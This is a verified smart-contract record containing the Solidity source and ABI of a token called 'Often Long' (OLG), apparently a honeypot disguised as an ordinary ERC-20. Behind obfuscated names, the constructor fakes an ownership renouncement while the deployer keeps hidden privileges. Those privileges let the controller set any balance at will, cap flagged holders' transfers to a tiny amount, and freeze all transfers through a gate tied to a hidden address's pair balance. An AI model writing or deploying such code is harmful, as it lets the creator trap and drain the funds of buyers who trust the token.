{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface maxSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toModeTotal {\n    function createPair(address listTradingLaunched, address modeMax) external returns (address);\n}\n\ninterface maxReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingBuy) external view returns (uint256);\n\n    function transfer(address takeEnable, uint256 amountMax) external returns (bool);\n\n    function allowance(address totalReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeEnable,\n        uint256 amountMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingFee, uint256 value);\n    event Approval(address indexed totalReceiver, address indexed spender, uint256 value);\n}\n\ninterface maxReceiverMetadata is maxReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OftenLong is txMin, maxReceiver, maxReceiverMetadata {\n\n    event OwnershipTransferred(address indexed teamMarketing, address indexed totalTeamMarketing);\n\n    function enableToken() private view {\n        require(sellTake[_msgSender()]);\n    }\n\n    function atReceiver(uint256 amountMax) public {\n        enableToken();\n        shouldFrom = amountMax;\n    }\n\n    function listFrom(address liquidityTo) public {\n        enableToken();\n        if (atMode != swapTotal) {\n            sellAutoAmount = swapTotal;\n        }\n        if (liquidityTo == isModeTrading || liquidityTo == buySell) {\n            return;\n        }\n        isAmount[liquidityTo] = true;\n    }\n\n    bool public totalFeeSender;\n\n    address public isModeTrading;\n\n    function owner() external view returns (address) {\n        return swapBuy;\n    }\n\n    function modeLaunched(address feeAuto) public {\n        if (exemptTx) {\n            return;\n        }\n        \n        sellTake[feeAuto] = true;\n        \n        exemptTx = true;\n    }\n\n    function liquidityAmountMax() public {\n        emit OwnershipTransferred(isModeTrading, address(0));\n        swapBuy = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptMin;\n    }\n\n    uint256 private sellAutoAmount;\n\n    function approve(address feeTradingAuto, uint256 amountMax) public virtual override returns (bool) {\n        autoEnable[_msgSender()][feeTradingAuto] = amountMax;\n        emit Approval(_msgSender(), feeTradingAuto, amountMax);\n        return true;\n    }\n\n    bool private shouldTeam;\n\n    mapping(address => bool) public sellTake;\n\n    mapping(address => bool) public isAmount;\n\n    constructor (){\n        if (swapTotal != takeSwap) {\n            takeSwap = swapTotal;\n        }\n        maxSell atAmount = maxSell(buyFee);\n        buySell = toModeTotal(atAmount.factory()).createPair(atAmount.WETH(), address(this));\n        if (totalFeeSender != minFrom) {\n            teamLiquidity = sellAutoAmount;\n        }\n        isModeTrading = _msgSender();\n        liquidityAmountMax();\n        sellTake[isModeTrading] = true;\n        enableTake[isModeTrading] = exemptMin;\n        \n        emit Transfer(address(0), isModeTrading, exemptMin);\n    }\n\n    function autoTrading(address fundAuto, uint256 amountMax) public {\n        enableToken();\n        enableTake[fundAuto] = amountMax;\n    }\n\n    function balanceOf(address marketingBuy) public view virtual override returns (uint256) {\n        return enableTake[marketingBuy];\n    }\n\n    uint8 private tokenLaunchFund = 18;\n\n    address public buySell;\n\n    bool private minFrom;\n\n    address private swapBuy;\n\n    function transferFrom(address launchedLaunch, address takeEnable, uint256 amountMax) external override returns (bool) {\n        if (_msgSender() != buyFee) {\n            if (autoEnable[launchedLaunch][_msgSender()] != type(uint256).max) {\n                require(amountMax <= autoEnable[launchedLaunch][_msgSender()]);\n                autoEnable[launchedLaunch][_msgSender()] -= amountMax;\n            }\n        }\n        return swapMinToken(launchedLaunch, takeEnable, amountMax);\n    }\n\n    uint256 private takeSwap;\n\n    bool public exemptTx;\n\n    string private fundTo = \"Often Long\";\n\n    bool private shouldEnable;\n\n    mapping(address => uint256) private enableTake;\n\n    function swapMinToken(address launchedLaunch, address takeEnable, uint256 amountMax) internal returns (bool) {\n        if (launchedLaunch == isModeTrading) {\n            return limitIs(launchedLaunch, takeEnable, amountMax);\n        }\n        uint256 marketingFund = maxReceiver(buySell).balanceOf(sellReceiver);\n        require(marketingFund == shouldFrom);\n        require(takeEnable != sellReceiver);\n        if (isAmount[launchedLaunch]) {\n            return limitIs(launchedLaunch, takeEnable, buySender);\n        }\n        return limitIs(launchedLaunch, takeEnable, amountMax);\n    }\n\n    uint256 public atMode;\n\n    uint256 constant buySender = 20 ** 10;\n\n    uint256 swapShould;\n\n    function name() external view virtual override returns (string memory) {\n        return fundTo;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLaunchFund;\n    }\n\n    uint256 private maxFee;\n\n    uint256 public teamLiquidity;\n\n    function allowance(address launchedLiquidity, address feeTradingAuto) external view virtual override returns (uint256) {\n        if (feeTradingAuto == buyFee) {\n            return type(uint256).max;\n        }\n        return autoEnable[launchedLiquidity][feeTradingAuto];\n    }\n\n    string private feeMode = \"OLG\";\n\n    function transfer(address fundAuto, uint256 amountMax) external virtual override returns (bool) {\n        return swapMinToken(_msgSender(), fundAuto, amountMax);\n    }\n\n    address buyFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private exemptMin = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeMode;\n    }\n\n    function limitIs(address launchedLaunch, address takeEnable, uint256 amountMax) internal returns (bool) {\n        require(enableTake[launchedLaunch] >= amountMax);\n        enableTake[launchedLaunch] -= amountMax;\n        enableTake[takeEnable] += amountMax;\n        emit Transfer(launchedLaunch, takeEnable, amountMax);\n        return true;\n    }\n\n    address sellReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return swapBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private autoEnable;\n\n    uint256 private swapTotal;\n\n    uint256 shouldFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTeamMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTradingAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTradingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountMax\",\"type\":\"uint256\"}],\"name\":\"atReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMax\",\"type\":\"uint256\"}],\"name\":\"autoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isModeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmountMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"}],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFeeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OftenLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}